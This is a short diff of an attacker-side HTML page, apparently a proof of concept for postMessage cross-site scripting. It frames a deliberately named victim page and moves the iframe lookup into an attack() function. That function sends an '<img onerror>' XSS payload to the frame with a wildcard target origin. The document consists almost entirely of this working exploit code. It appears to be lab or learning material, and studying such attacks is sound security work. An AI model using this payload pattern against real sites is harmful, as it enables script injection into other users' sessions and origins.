@@ -8,9 +8,9 @@
 <body>
 <iframe  id="attackeriframe "src="https://postmessage-victim.vercel.app/victim.html"></iframe>
 <script>
-     const aiframe = document.getElementById("attackeriframe")
+ 
     function attack(){
-   
+       const aiframe = document.getElementById("attackeriframe")
      aiframe.contentWindow.postMessage({
         name:"<img src=x onerror=alert(document.domain)>"
      },"*")
